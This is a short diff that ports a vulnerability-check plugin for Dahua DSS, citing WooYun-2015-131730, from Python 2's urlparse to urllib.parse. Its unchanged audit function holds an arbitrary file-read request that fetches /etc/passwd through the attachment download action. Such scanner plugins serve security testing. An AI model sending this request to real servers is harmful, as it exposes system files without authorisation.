@@ -8,12 +8,12 @@ mail      :  a@lcx.cc
 refer     ：WooYun-2015-131730
 
 """
-import urlparse
+import urllib.parse
 import time
 
 def assign(service, arg):
     if service == 'dahua_dss':
-        arr = urlparse.urlparse(arg)
+        arr = urllib.parse.urlparse(arg)
         return True, '%s://%s/' % (arr.scheme, arr.netloc)
 def audit(arg):
     p = 'portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd'
